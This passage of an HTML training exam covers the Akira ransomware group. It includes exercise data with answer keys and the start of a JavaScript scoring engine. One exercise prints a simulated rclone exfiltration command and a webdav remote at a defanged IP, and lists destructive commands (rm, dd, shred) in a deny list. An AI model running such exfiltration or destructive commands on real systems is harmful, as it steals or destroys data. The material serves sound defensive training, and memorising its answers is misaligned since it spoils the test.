  --accent-soft:#122641;
  --amber:#ffb95e;
  --amber-bright:#ffd08a;
  --amber-soft:#2d2210;
  --green:#43d98c;

  --bad:#f87171; --bad-bg:#301418; --bad-line:#6d2b30;

  --miss:#9fb0c5;

  --sev-easy:#3fd68f; --sev-easy-bg:#0d2b1e; --sev-easy-line:#2b8a63;
  --sev-medium:#fbbf24; --sev-medium-bg:#2d2410; --sev-medium-line:#96771d;

  --sev-xhard:#f87171; --sev-xhard-bg:#331417; --sev-xhard-line:#9c3d42;
  /* timer state colours */
  --st-run:#4ade80; --st-pman:#fbbf24; --st-pauto:#38bdf8; --st-end:#f87171;
  /* focus + misc */
  --focus:#7dd3fc;
  --term-text:#d7e4f8; --term-prompt:#43d98c; --term-bg:#0a1120; --term-line:#2a3c5c;
  --on-accent:#06101f; --on-amber:#241703; --lg-f:#c4b5fd;

*{box-sizing:border-box}

.chips{display:flex;flex-wrap:wrap;gap:8px;margin:8px 0}

, "Manual pause: you can also press the Pause button yourself for a real break. The exercise is hidden while you pause, and your break time is measured and shown at the end. The header shows '⏸ PAUSED — manual (press Resume)'.", "Hints: each exercise has one hint, worth −10% of that exercise's credit. The hint is a nudge, not the answer.", "Skip: every exercise has a Skip button. Skipped exercises go to a review pool. Before the exam ends you can return to them as often as you like while the timer runs. If you submit while exercises are still unanswered, they are simply excluded from the score — they count neither for you nor against you.", "Pass mark and timer: you pass at 70% or more, computed only over the exercises you actually answered. This exam has 16 exercises and a total timer of 60 minutes. If the timer ends, the exam ends and your answered exercises are scored."], "entityType": "a Group (a threat-actor profile object in the ATT&CK framework)", "entity": ["In MITRE ATT&CK, a Group object is a profile of a real threat actor: who they are, which other names they use, and how they attack. A group page collects the techniques (T-codes) and software (S-codes) the actor has been seen using in real incidents. This exam is about the group Akira, ID G1024.", "Akira is a ransomware group. It has been active since at least March 2023. Other research teams track the same actor under different names: Secureworks calls it GOLD SAHARA, CrowdStrike calls it PUNK SPIDER, and Palo Alto Networks Unit 42 calls it Howling Scorpius. You will meet all four names in real reports — they mean the same actor.", "How Akira works, in simple steps: it steals the password of a real account — often a VPN account that uses a password only, with no second step. It logs in through that remote door. Then it looks around with tools like Nltest, AdFind, Advanced IP Scanner, and MASSCAN. It steals passwords from memory and password stores with tools like Mimikatz and LaZagne, and it dumps Kerberos tickets with scripts. It moves between servers with RDP and PsExec. It keeps doors open with AnyDesk or PuTTY. It packs the data it wants with WinRAR, copies it out with Rclone, and only then runs its ransomware — Akira, Akira_v2, or Megazord — to encrypt files on Windows servers and on VMware ESXi hypervisors. Before encrypting, it may delete administrator accounts. This 'steal first, lock second' method is called double extortion: pay us, or we publish your data."], "workareas": ["SOC analysts use Akira profiles to triage alerts: a 3 a.m. Rclone run or a type-10 RDP logon means far more when you know the playbook.", "Threat hunters build hunt plans from the group's techniques — for example, hunting Nltest or AdFind runs followed by archive creation.", "Incident responders use the profile to predict next steps: if you see WinRAR staging, expect an Rclone upload, then encryption.", "Cyber threat intelligence (CTI) analysts write group profiles, vendor-alias mappings, and CISO briefings from ATT&CK group pages.", "Detection engineers turn the listed techniques into SIEM and EDR analytics, and pick the data sources that can see them.", "GRC analysts and control owners map the mitigations — MFA on remote access, egress control, hypervisor hardening — to frameworks and budgets."], "entityClose": ["The risks this object helps you manage: double-extortion ransomware with publication threats, encryption of servers and hypervisors, and account compromise that starts with one weak VPN login. Knowing the actor turns noisy alerts into a story you can stop."], "kwnote": "Every keyword below is exercised by at least one exercise in this exam — nothing here is decoration. The other difficulty tiers of this topic carry the rest of the group's profile."}, "themes": [{"name": "Attribution & Threat Actor Profile", "items": [{"label": "GOLD SAHARA (Secureworks)", "tag": "alias-gs"}, {"label": "Howling Scorpius (Unit 42)", "tag": "alias-hs"}, {"label": "Double extortion", "tag": "double-extortion"}, {"label": "Overlaps with Conti", "tag": "conti"}, {"label": "Windows + VMware ESXi targets", "tag": "platforms"}]}, {"name": "Initial Access & Valid Accounts", "items": [{"label": "T1133 External Remote Services", "tag": "T1133"}, {"label": "T1078 Valid Accounts", "tag": "T1078"}, {"label": "Single-factor VPN", "tag": "single-factor"}]}, {"name": "Discovery", "items": [{"label": "T1482 Domain Trust Discovery (Nltest, AdFind)", "tag": "T1482"}]}, {"name": "Lateral Movement & Remote Access", "items": [{"label": "T1219 Remote Access Tools (AnyDesk, PuTTY)", "tag": "T1219"}]}, {"name": "Collection & Exfiltration", "items": [{"label": "T1560.001 Archive via Utility (WinRAR)", "tag": "T1560.001"}, {"label": "T1567.002 Exfiltration to Cloud Storage (Rclone, S1040)", "tag": "T1567.002"}]}, {"name": "Defense Evasion", "items": [{"label": "T1036.005 Masquerading", "tag": "T1036.005"}, {"label": "T1531 Account Access Removal", "tag": "T1531"}]}, {"name": "Impact & Extortion", "items": [{"label": "T1486 Data Encrypted for Impact", "tag": "T1486"}, {"label": "Akira_v2 (S1194)", "tag": "s1194"}, {"label": "Megazord (S1191)", "tag": "s1191"}]}], "exercises": [{"id": "X01", "type": "multi", "name": "Midnight VPN anomaly", "summary": "Two signals, one verdict — resolve the conflict.", "scenario": [{"label": "ARTEFACT 1 — Situation, 00:37", "kind": "prose", "text": "The VPN gateway accepts svc_backup from an ASN never used by that account. Forty minutes later, a Tenable scanner job (owner: vuln-team, calendar-approved) starts inside the network. The VPN vendor dashboard shows 'no anomalies' for the account. The identity team notes svc_backup has had password-only auth since 2024, exempted by an old policy."}, {"label": "ARTEFACT 2 — Gateway and scheduler logs", "kind": "log", "lines": ["00:37:12 VPN-GW01 Accepted user=svc_backup src=203[.]0[.]113[.]88 asn=NEW asn_hist=corp-isp-only auth=password mfa=exempt", "01:18:03 SCHED Tenable scan job#4471 owner=vuln-team scope=internal/24 state=running"]}], "question": "Select every defensible statement.", "options": ["The valid-account login is the stronger signal: a new-ASN, password-only VPN login matches Akira's documented entry", "The scanner activity needs correlation before you call it hostile — scheduled jobs can be legitimate or abused", "The vendor dashboard's 'no anomalies' flag settles the question — close the alert", "The proportionate first move is to shut down the whole VPN farm"], "correct": [0, 1], "hint": "Vendor anomaly scores are context-free. Weigh who authenticates, from where, with what.", "explain": "Akira enters with valid accounts on single-factor remote services, so a new-ASN password-only login is the classic shape of that technique (T1078 with T1133) — the dashboard score is not evidence against it. The scan, however, needs correlation: it may be the calendar-approved job or an attacker riding the schedule.\n\nA full VPN shutdown is a business-wide action you have not earned yet — disable the one account and its sessions first. The conflicting signals resolve by weight of evidence, not by which arrived first.", "study": "Akira entry chain in context; signal weighing under conflict.", "tags": ["T1078", "T1133", "single-factor"]}, {"id": "X02", "type": "branch", "name": "Encryptor on esx-03", "summary": "Hypervisor incident with business cost — three decisions.", "scenario": [{"label": "ARTEFACT 1 — Situation, 02:12", "kind": "prose", "text": "The VM sensor flags an Akira-like encryptor executing on host esx-03. Fourteen VMs run on it, including the patient-accounting system. Three VMs already show .akira files. vCenter is reachable. Legal says 'no evidence destroyed'; the hospital CIO says accounting back 'yesterday'.\n\nYou have four minutes to set the plan."}], "question": "Three chained decisions — each depends on the one before.", "steps": [{"q": "STEP 1 OF 3 — First containment move?", "options": ["Network-isolate esx-03 and its affected VMs, accepting the accounting downtime", "Power off esx-03 instantly, VMs included", "Wait for the encryptor to finish, then assess", "Snapshot all VMs to preserve state and leave everything running"], "correct": 0, "why": "Isolation stops spread and keeps disks and memory intact for forensics. A hard power-off destroys volatile evidence; waiting lets encryption finish; snapshots alone leave the encryptor running."}, {"q": "STEP 2 OF 3 — Evidence move inside the same window?", "options": ["Capture VM memory and hypervisor logs before any rebuild or restore", "Rebuild esx-03 from scratch immediately", "Delete the encryptor binary from the datastore", "Email vendors asking what the malware is"], "correct": 0, "why": "Akira's playbook lives in memory and logs — dumped tickets, archive runs, exfil commands. Rebuilding or deleting artefacts destroys exactly what legal and insurers will ask for."}, {"q": "STEP 3 OF 3 — A ransom note appears with a 48-hour clock. The CIO asks you to 'just pay it'. Your move?", "options": ["Escalate to legal, management, insurer, and law enforcement; preserve the contact channel and evidence", "Pay from the emergency fund tonight", "Delete the note and the attacker's email to avoid panic", "Ignore the deadline silently and keep working"], "correct": 0, "why": "Payment is a legal, board, and insurer decision with sanctions screening — not an engineer's call. Keeping the channel and evidence preserves every option; destroying the note destroys negotiating and evidentiary value."}], "hint": "You cannot undo a destroyed hypervisor memory image, and payment is not an engineering decision.", "explain": "Step 1: targeted isolation accepts real downtime — the cost you accept is smaller than the spread you prevent. Step 2: memory and logs before any rebuild, because Akira's exfil story is told there. Step 3: escalate; payment decisions belong to legal and the board.\n\nThe chain is the lesson: each step enables the next. Accepting the accounting downtime in step 1 is what buys the clean evidence in step 2 and the strong legal position in step 3.", "study": "Akira ESXi targeting; IR decision chains with business cost.", "tags": ["platforms", "T1486", "T1531"]}, {"id": "X03", "type": "qcm", "name": "The power-off policy trap", "summary": "A widely used best practice that is wrong here.", "scenario": [{"label": "ARTEFACT 1 — Policy KR-7 vs the case", "kind": "prose", "text": "Company policy KR-7: 'On confirmed ransomware, immediately power off affected servers.' Akira is confirmed on FS-01, but egress logs show a 22 GB upload completed forty minutes before encryption started.\n\nIR wants to deviate from the policy. The CISO asks why."}], "question": "Why is blind power-off the wrong first move against Akira?", "options": ["Akira steals data before encrypting, so power-off destroys the volatile evidence of what left — isolate at the network instead", "Power-off corrupts disks, making files unrecoverable even with a decryptor", "Akira detects power loss and re-encrypts faster afterwards", "Power-off voids hardware warranties on hypervisors"], "correct": [0], "hint": "The upload finished forty minutes before the encryption began.", "explain": "With double extortion the theft already happened; the remaining value is proving what was taken — and that proof sits in memory and live logs. Network isolation stops further damage without destroying it.\n\nThis is the 'widely used best practice is wrong in this context' trap: a generic ransomware rule ignores Akira's specific exfil-first model. Profile-aware deviation, agreed in advance with the CISO, is the senior move.", "study": "Double extortion order; evidence-value reasoning.", "tags": ["double-extortion", "T1486"]}, {"id": "X04", "type": "drag", "name": "Gap check against the profile", "summary": "You cover three techniques — where are the holes?", "scenario": [{"label": "ARTEFACT 1 — Purple-team report extract", "kind": "prose", "text": "Your current analytics cover: (1) encryptor execution on Windows and ESXi (T1486); (2) RDP lateral chains (T1021.001); (3) PowerShell downloader patterns (T1059.001).\n\nThe report asks you to map the remaining Akira-adjacent techniques. Drag each pool item to the correct column: a real gap that needs an analytic, or not observed for Akira and deprioritised."}], "question": "Drag each technique into the correct column.", "items": [{"id": "w1", "label": "T1567.002 — Rclone exfil to cloud storage"}, {"id": "w2", "label": "T1482 — Domain Trust Discovery"}, {"id": "w3", "label": "T1133 — External Remote Services"}, {"id": "w4", "label": "T1566 — Phishing"}], "zones": [{"id": "x1", "label": "Uncovered gap (needs an analytic)"}, {"id": "x2", "label": "Not observed for Akira (deprioritise)"}], "mapping": [["w1", "x1"], ["w2", "x1"], ["w3", "x1"], ["w4", "x2"]], "hint": "Cross-check the pool against the technique table on the G1024 page before you place anything.", "explain": "Rclone exfil, AD trust discovery, and VPN entry are all documented Akira techniques with no analytic in your list — three real gaps. Phishing is not in the observed profile, so it is a deprioritisation decision, not a detection to build today.\n\nCoverage-gap mapping is a standard detection-engineer deliverable, and the discipline is the same in both directions: build what the actor does, and be able to say why you do not build the rest.", "study": "The G1024 technique table; coverage-gap analysis.", "tags": ["T1567.002", "T1482", "T1133"]}, {"id": "X05", "type": "multi", "name": "Variant claim under review", "summary": "Megazord: same group, new label?", "scenario": [{"label": "ARTEFACT 1 — Situation", "kind": "prose", "text": "A vendor blog claims 'Megazord is simply rebranded Akira.' Your telemetry: a Megazord-linked binary on a client estate shows Service Stop and Log Enumeration — both listed for Akira_v2 in the CISA advisory — but you never observe the PowerShell credential-harvesting chain.\n\nThe client's board wants a name for the attacker 'by Friday'."}], "question": "Select every defensible statement for the board note.", "options": ["Treat the actor as Akira-linked at stated confidence — shared behaviours match the documented variant family", "The unobserved PowerShell chain is incomplete information, not proof of a different group", "The absence of one technique proves a different actor", "Vendor variant naming always equals the exact group identity"], "correct": [0, 1], "hint": "Confidence levels and 'not observed' are different claims from 'proven different'.", "explain": "Matching Service Stop and Log Enumeration supports an Akira-family assessment at a stated confidence level. Not seeing one chain is a telemetry gap — absence of evidence is not evidence of absence.\n\nOver-claiming burns institutional trust; under-claiming wastes the intelligence. Variant labels are vendor bookkeeping, not group identity. Writing 'Akira-linked, medium confidence, based on X and Y' is the defensible board deliverable.", "study": "Akira_v2 and Megazord in the CISA advisory; confidence language.", "tags": ["s1191", "s1194"]}, {"id": "X06", "type": "order", "name": "Sequence the response", "summary": "Exfil in progress — order five actions.", "scenario": [{"label": "ARTEFACT 1 — Active engagement", "kind": "prose", "text": "rclone is uploading from DC-01 right now. The compromised svc_backup account is still logged into the VPN. The encryptor has not appeared.\n\nActions to sequence: (A) block egress to the attacker destination and cloud-storage categories; (B) disable the compromised accounts and revoke live sessions; (C) capture memory from DC-01 and export current logs; (D) begin restore-prep from backups once containment holds; (E) brief legal and management, preserving the future ransom channel."}], "question": "Rank the five actions from first to last.", "items": ["Block egress to the attacker destination", "Disable compromised accounts and revoke sessions", "Capture memory and export current logs", "Begin restore-prep once containment holds", "Brief legal and management, preserve the channel"], "hint": "Two actions are about control, one about evidence, and two about what comes after containment.", "explain": "A stops data leaving now; B stops the actor walking back in; C freezes the proof of what already left — critical with Akira's exfil-first model; D starts recovery only after containment holds; E follows, so legal has facts to act on.\n\nIn real life E runs in parallel, but as a sequence it follows containment. Ranking exposes whether you protect evidence before convenience — the senior-IR instinct under time pressure.", "study": "Akira exfil-first model; response sequencing.", "tags": ["T1567.002", "T1078", "T1486"]}, {"id": "X07", "type": "qcm", "name": "One sentence for the board", "summary": "Briefing the CISO without over-claiming.", "scenario": [{"label": "ARTEFACT 1 — CISO request", "kind": "prose", "text": "Your CISO: 'Is Akira Conti? I need one sentence for the board pack.' You have the G1024 page: Akira shows multiple overlaps with Conti ransomware. Legal will read this sentence."}], "question": "Which sentence is defensible?", "options": ["Akira shares tooling and TTP overlap with Conti-era ransomware operations, so Conti-era detections remain relevant", "Akira is operated by the same individuals as Conti", "Akira has no relationship to Conti at all", "Akira is a government-run entity per the overlaps"], "correct": [0], "hint": "Overlap supports a detection-relevance claim; it does not support an identity claim.", "explain": "The page documents overlap, which justifies reusing Conti-era analytics — a concrete, defensible operational benefit. Claiming the same operators, no relationship, or state sponsorship all over-run the evidence in different directions.\n\nBoard language must survive legal and second-source review. The correct sentence does exactly what a CTI deliverable must do: true, useful, and impossible to falsify with the source material.", "study": "Akira-Conti overlap; attribution wording.", "tags": ["conti"]}, {"id": "X08", "type": "fill", "name": "Complete the CTI report", "summary": "Four blanks in the executive summary.", "scenario": [{"label": "ARTEFACT 1 — Executive summary draft", "kind": "prose", "text": "Complete the executive summary. One word per blank from the shuffled bank. Every blank has exactly one documented answer from the G1024 profile — resist the near-miss tools."}], "question": "Fill all four blanks correctly.", "text": "The actor (Akira / GOLD SAHARA) gained access via single-factor ___ logins, enumerated the estate with nltest and AdFind, staged data in ___ archives, exfiltrated via ___ to cloud storage, and deleted ___ accounts immediately before encryption.", "blanks": ["VPN", "WinRAR", "Rclone", "administrator"], "bank": ["VPN", "WinRAR", "Rclone", "administrator", "SNMP", "FileZilla", "guest", "temporary"], "hint": "Each blank has exactly one documented answer from the profile. The near-miss tools would fail an intelligence review.", "explain": "Each blank maps to the page: VPN entry (T1133), WinRAR staging (T1560.001), Rclone exfil (T1567.002), and administrator-account deletion (T1531).\n\nSNMP, FileZilla, guest, and temporary are near-misses that read plausibly but would fail intelligence review — reports drive budgets, and one wrong tool name in an executive summary can misdirect a whole quarter of spending.", "study": "The G1024 technique table, end to end.", "tags": ["T1133", "T1482", "T1560.001", "T1567.002", "T1531"]}, {"id": "X09", "type": "multi", "name": "Truncated hypervisor log", "summary": "What can you actually claim in ten minutes?", "scenario": [{"label": "ARTEFACT 1 — Situation", "kind": "prose", "text": "You receive esx-03 logs for the incident window — the file ends mid-line (truncated). Backup jobs failed the previous night (job #2214). You see the encryptor process spawn on esx-03 and .akira files on two VMs. Nothing about esx-01, esx-02, or the backup server is in the file. Legal asks for a scope statement in ten minutes."}, {"label": "ARTEFACT 2 — esx-03 log extract", "kind": "log", "lines": ["02:11:58 esx-03 vmkernel: worker=encryptor-proc spawn path=/vmfs/volumes/datastore1/.tmp/ status=running", "02:12:40 esx-03 vpxa: VM=vm-114 guest file change rate high extension=.akira", "02:12:59 esx-03 vmk[truncated mid-line]"]}], "question": "Select every claim the log supports.", "options": ["esx-03 is actively impacted — encryptor execution and encrypted files are on it", "Scope beyond esx-03 cannot be confirmed from this file alone", "The failed backup job proves Akira ran on the backup server", "The truncation proves the attacker deleted the logs"], "correct": [0, 1], "hint": "Claim what the lines show; label what is missing. Truncation is not deletion proof.", "explain": "The lines directly show encryptor activity and .akira files on esx-03. Everything else is out of the file's scope — a senior statement of confidence names both.\n\nThe backup failure has many causes, and Akira_v2 does enumerate logs — but a truncated export is not evidence of deletion. Precise scope statements protect the investigation and the legal case; over-claims get dismantled in court.", "study": "Akira_v2 Log Enumeration; scope-of-evidence discipline.", "tags": ["s1194", "platforms", "T1486"]}, {"id": "X10", "type": "multi", "name": "Single signal, quiet hour", "summary": "One nltest, nothing else — what now?", "scenario": [{"label": "ARTEFACT 1 — Situation, 11:04", "kind": "prose", "text": "One nltest /domain_trusts run on WKS-114 by t.admin, a Tier-2 admin. No VPN anomalies, no new software, no archive or upload activity in the last 72 hours. t.admin's badge shows in a meeting room next to your desk.\n\nThe queue is busy. Your lead: 'Handle it proportionately.'"}], "question": "Select the two proportionate next steps.", "options": ["Review authentication and process history around WKS-114 before escalating", "Ask the directory team whether this was a routine action for t.admin", "Isolate WKS-114 and declare an Akira incident now", "Close the alert with no action at all"], "correct": [0, 1], "hint": "Proportionality applies in both directions: over-reaction and inaction both fail.", "explain": "Both correct steps are cheap evidence-gathering — the 'gather more evidence' answer. One benign-capable signal plus a verified-human context earns verification, not incident declaration.\n\nImmediate isolation of a verified admin's workstation burns trust and business time on a likely-routine action. Closing without any check risks missing the slow start of the Akira chain — discovery is always its quietest moment. Proportionality is the senior skill here.", "study": "Akira's discovery chain; alert triage proportionality.", "tags": ["T1482", "T1078"]}, {"id": "X11", "type": "branch", "name": "Rclone or backup?", "summary": "Conflicting signals on the CFO's floor.", "scenario": [{"label": "ARTEFACT 1 — Situation, 23:41", "kind": "prose", "text": "Egress shows rclone on CFO-WKS copying \\\\FS-01\\finance to bucket newbucket-8f3. Finance insists 'nightly rclone backups are normal for us' — but the backup team's runbook shows their rclone runs only from BKP-01 at 02:00 under ticket CHG-2211.\n\nThis run: a laptop, 23:41, a bucket created two days ago. The CFO threatens to escalate if you 'touch anything'."}], "question": "Three chained decisions under executive pressure.", "steps": [{"q": "STEP 1 OF 3 — Which signal wins, and what do you record?", "options": ["The destination, host, and time anomaly wins — the 'rclone is normal' claim fails the runbook test", "Finance's claim wins — do nothing tonight", "Both signals are equally valid — wait and see", "The bucket age wins — new buckets are always fine"], "correct": 0, "why": "The runbook test defeats the 'normal' claim: wrong host, wrong time, wrong destination. Recording that reasoning is what makes the call defensible later."}, {"q": "STEP 2 OF 3 — Proportionate live action while you verify?", "options": ["Block or throttle that destination and watch the host, leaving other business egress alone", "Cut the company's internet edge entirely", "Shut down the finance file server without approval", "Delete the rclone binary on CFO-WKS"], "correct": 0, "why": "Throttling one destination contains the likely exfil while keeping business traffic — proportional. Cutting the edge or killing servers without approval creates the impact you were told to avoid; deleting the binary destroys evidence."}, {"q": "STEP 3 OF 3 — Correlation confirms the account is compromised. Next?", "options": ["Disable the account, revoke sessions, open the IR bridge, preserve evidence", "Wait for the encryption to be one hundred percent sure", "Email the CFO's staff asking for their passwords", "Pay the ransom preemptively"], "correct": 0, "why": "Once compromise is confirmed: kill the account, revoke sessions, open the IR bridge, preserve evidence. The Akira chain — archive, upload, encrypt — rewards every minute you cut earlier."}], "hint": "One claim fails against a runbook; proportionality survives even angry executives; confirmation means act.", "explain": "Step 1: evidence beats assertion — the runbook is the tiebreaker, and writing down why is the senior habit. Step 2: the proportionate control is narrow (one destination) rather than broad (the whole edge). Step 3: confirmation converts watching into acting — account kill, sessions, IR bridge, evidence.\n\nThe chain rewards discipline: each step keeps options open for the next. Note the Akira payoff — cutting the exfil path before encryption saves the finance data twice.", "study": "Akira T1567.002 in context; proportional containment.", "tags": ["T1567.002"]}, {"id": "X12", "type": "terminal", "name": "Read-only proof on the image", "summary": "Confirm the Rclone artefacts without touching evidence.", "scenario": [{"label": "ARTEFACT 1 — Environment and constraints", "kind": "prose", "text": "The incident image is mounted read-only at /mnt/ir_image/. The collected artefact akira_artifacts.txt contains concatenated config and history strings.\n\nLegal requires: read-only access only, and the proof must survive court review. The IR lead reminds you the LIVE disk at /mnt/live_disk/ is off limits — touching it changes evidence.\n\nThis exercise runs on a reduced 3-minute timer. Type the command, press Enter, then Check."}], "question": "Type and run the read-only command that proves rclone artefacts exist in the collected file.", "term": {"prompt": "analyst@ir-wks", "ls": "ir_image  live_disk", "sim": "[rclone] config_dump: remote personal-bucket type=webdav url=hxxp://203[.]0[.]113[.]44:8080\n[rclone] cmd_hist: rclone copy \\\\FS-01\\finance personal-bucket:fin-8f3 --transfers 8", "canonical": "grep -i rclone /mnt/ir_image/akira_artifacts.txt", "elements": ["grep", "-i", "/mnt/ir_image/akira_artifacts.txt", "rclone"], "danger": ["/mnt/live_disk", "> ", ">>", "rm ", "dd ", "sed -i", "mv ", "shred", "tee "], "exTimer": 180, "parts": ["grep — reads only; the command itself cannot alter evidence.", "-i — case-insensitive, matching any letter case of the keyword.", "/mnt/ir_image/akira_artifacts.txt — the collected image, not the live disk.", "rclone — the keyword legal needs in the exhibit."]}, "hint": "The image, not the live disk. A reader, not a writer.", "explain": "The canonical command is grep -i rclone /mnt/ir_image/akira_artifacts.txt. grep reads; -i widens the match; the path targets the collected image, never the live disk; rclone is the keyword.\n\nCommands that redirect, move, or edit would alter evidence, and anything touching /mnt/live_disk would compromise the case. The two commands in your head — one safe, one destructive — are the real test: the command is easy; choosing the safe one under pressure is the judgement. The config dump it returns (a webdav remote to an outside address) is exactly the Rclone exfil exhibit Akira cases turn on.", "study": "Forensic read-only discipline; Akira Rclone artefacts.", "tags": ["T1567.002"]}, {"id": "X13", "type": "multi", "name": "Board metrics that matter", "summary": "GRC input to the quarterly risk pack.", "scenario": [{"label": "ARTEFACT 1 — Board request", "kind": "prose", "text": "The board wants 'our exposure to Akira-style ransomware' in three measurable lines. Candidates: count of single-factor remote-access accounts; cloud-storage egress allow-list status; hypervisor (ESXi) patching and segmentation status; phishing-simulation pass rate; printer-fleet firmware currency.\n\nSelect the three metrics that map to the documented Akira playbook."}], "question": "Select the three metrics that map to the documented playbook.", "options": ["Single-factor remote-access account count", "Cloud-storage egress allow-list status", "Hypervisor patching and segmentation status", "Phishing-simulation pass rate", "Printer-fleet firmware currency"], "correct": [0, 1, 2], "hint": "Map each metric to a documented behaviour: entry, exfil, or platform. The others are generic hygiene.", "explain": "Entry (single-factor VPN — T1133/T1078), exfil (cloud egress — T1567.002), and platform (ESXi — the documented hypervisor target) all map to the profile with measurable states.\n\nPhishing simulations and printer firmware are fine hygiene but answer a different threat model — irrelevant-but-realistic noise is exactly what a GRC analyst must filter out when a board asks about a specific actor.", "study": "Akira profile to control mapping; GRC reporting.", "tags": ["single-factor", "T1567.002", "platforms"]}, {"id": "X14", "type": "qcm", "name": "Zero downtime demanded", "summary": "The CISO's constraint versus the spread.", "scenario": [{"label": "ARTEFACT 1 — Situation, 19:20", "kind": "prose", "text": "An encryptor is active on 3 of 40 VMs, all on esx-02. The CISO: 'Absolutely zero downtime — we have customers on these.' Encryption is progressing on the three VMs. You must pick the defensible action."}], "question": "Which action is correct?", "options": ["Isolate the affected VMs and esx-02's storage network now, accepting limited contained downtime", "Wait for business hours to avoid any downtime", "Power off all 40 VMs across the cluster immediately", "Keep everything running and only watch the encryption"], "correct": [0], "hint": "The cost you accept must be smaller than the cost you prevent.", "explain": "Targeted isolation accepts minutes of downtime on already-impacted systems to save the other 37 VMs — the proportionate cost. Waiting lets Akira finish encrypting and possibly move; powering off everything is self-inflicted outage far beyond the threat; watching is not a control.\n\n'Here is the cost I accept, and why' is the senior-IR sentence the CISO needs — and with Akira's exfil-first model, it also protects the evidence window before encryption completes.", "study": "Containment trade-offs under Akira's playbook.", "tags": ["T1486", "platforms"]}, {"id": "X15", "type": "match", "name": "Handling the claims", "summary": "Four sources, four confidence treatments.", "scenario": [{"label": "ARTEFACT 1 — Intel inbox, Monday", "kind": "prose", "text": "Four claims about the actor arrived this morning. Each earns a different confidence treatment. Match each claim to the handling it deserves — this table is what a CTI analyst maintains in a real intelligence program."}], "question": "Match each claim to its correct handling.", "pairs": [["Secureworks tracks the actor as GOLD SAHARA", "Vendor alias — map it to Akira in your tracking"], ["The CISA advisory details Akira_v2 and Megazord", "Authoritative technical detail — cite it in detection work"], ["A blog claims Akira is state-sponsored", "Unverified claim — treat with caution, do not repeat as fact"], ["Unit 42 profiles the actor as Howling Scorpius", "Vendor assessment — record the naming and its scope"]], "hint": "Each source earns a different confidence treatment. Match claim to handling, not to Akira facts.", "explain": "Vendor aliases are bookkeeping to map. CISA advisories are citable technical authority. Unverified attribution claims must be quarantined until corroborated. Vendor assessments are recorded with their naming and scope.\n\nThe near-miss is treating every inbox item as equal authority. This claim-handling table is exactly what keeps an intel program trusted — one mis-cited claim can infect a year of reporting.", "study": "Source handling: aliases, advisories, vendor assessments, unverified claims.", "tags": ["alias-gs", "s1194", "s1191", "alias-hs"]}, {"id": "X16", "type": "drag", "name": "Red next, blue next", "summary": "The same blocked upload, from both chairs.", "scenario": [{"label": "ARTEFACT 1 — Purple-team session, 21:10", "kind": "prose", "text": "You blocked the attacker's Rclone destination twenty minutes ago. The engagement is live. Your purple-team lead wants the same scenario from both chairs: what the adversary likely does next versus what the defender should do next.\n\nPool of six actions. Drag each to the chair whose goal it serves."}], "question": "Drag each action onto the side it belongs to.", "items": [{"id": "q1", "label": "Switch exfiltration to another cloud service"}, {"id": "q2", "label": "Deploy the ESXi encryptor and delete admin accounts"}, {"id": "q3", "label": "Masquerade new tools as legitimate binaries"}, {"id": "q4", "label": "Allow-list egress only for sanctioned storage"}, {"id": "q5", "label": "Rotate VPN credentials and enforce MFA"}, {"id": "q6", "label": "Add analytics chaining nltest/adfind, then archive, then rclone"}], "zones": [{"id": "y1", "label": "Likely adversary next move (red)"}, {"id": "y2", "label": "Defender next move (blue)"}], "mapping": [["q1", "y1"], ["q2", "y1"], ["q3", "y1"], ["q4", "y2"], ["q5", "y2"], ["q6", "y2"]], "hint": "Three items advance the attack. Three items remove advantage. Sort by whose goal each serves.", "explain": "Red: once blocked, Akira's documented pattern suggests alternates — another cloud service for exfil (T1567.002 flexibility), pushing on to encryption plus account deletion (T1486, T1531), and renaming tools to blend in (T1036.005).\n\nBlue: allow-list only sanctioned storage so the alternates die too, remove the credential advantage with MFA and rotation, and add chain analytics that catch the sequence — discovery, then archive, then upload — not one tool in isolation.\n\nDual-perspective thinking, seeing the next move from both chairs, is the core of purple-team work against a profiled actor.", "study": "The full Akira playbook from both the red and blue perspectives.", "tags": ["T1567.002", "T1486", "T1531", "T1036.005", "T1219", "T1482"]}]}

<script>
/* CyberPulseAcademy exam engine — shared (G1024 Akira severity files).
   Vanilla JS, no external requests. Implements: partial-credit scoring,
   check-triggered auto-pause + manual pause state machine, hints, skip/review,
   retake with reshuffle, CYBERPULSE score reporting and init handshake. */
(function () {
  'use strict';
  var E = JSON.parse(document.getElementById('exam-data').textContent);

  /* ---------- tiny helpers ---------- */
  function $(s, r) { return (r || document).querySelector(s); }
  function el(t, c, x) { var n = document.createElement(t); if (c) n.className = c; if (x != null) n.textContent = x; return n; }
  function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
  function shuffle(a) { a = a.slice(); for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)), t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
  function fmt(sec) { sec = Math.max(0, Math.floor(sec)); var m = Math.floor(sec / 60), r = sec % 60; return (m < 10 ? '0' : '') + m + ':' + (r < 10 ? '0' : '') + r; }
  function clampTxt(s) { return s.length > 42 ? s.slice(0, 40) + '…' : s; }

  /* ---------- scoring (mandatory contract) ---------- */
  function scoreExercise(selectedItems, correctItems) {
    var N = correctItems.length, H = 0, W = 0, i;
    for (i = 0; i < selectedItems.length; i++) {
      if (correctItems.indexOf(selectedItems[i]) >= 0) { H++; } else { W++; }
    }
    if (N === 0) { return 0; }
    return Math.max(0, (H - W) / N);
  }
  window.scoreExercise = scoreExercise; /* exposed for site-side audits */

  /* ---------- state ---------- */
  var S = null;
  function freshState() {
    return {
      phase: 'intro', order: [], pos: 0,
      creditSum: 0, answered: 0, rec: {}, skipped: [],
      timer: { state: 'ENDED', remain: E.minutes * 60, msRun: 0, msManual: 0, msAuto: 0 },
      exT: { total: 0, remain: 0 },
      cur: null, reported: false, lastTick: 0, autoSkipNote: ''
    };
  }

  var TIMER_LABEL = {
    RUNNING: ['▶', 'RUNNING', 'state-run'],
    PAUSED_MANUAL: ['⏸', 'PAUSED — manual (press Resume)', 'state-pman'],
    PAUSED_AUTO_CHECK: ['⏳', 'PAUSED — reviewing feedback (resumes on Next)', 'state-pauto'],
    ENDED: ['⏹', 'ENDED', 'state-end']
  };

  /* ---------- timer state machine ---------- */
  function setTimer(state) { S.timer.state = state; renderTopbar(); }
  setInterval(function () {
    var now = Date.now(), t, dt;
    if (!S) { return; }
    t = S.timer;
    if (!S.lastTick) { S.lastTick = now; return; }
    dt = (now - S.lastTick) / 1000; S.lastTick = now;
    if (t.state === 'RUNNING') {
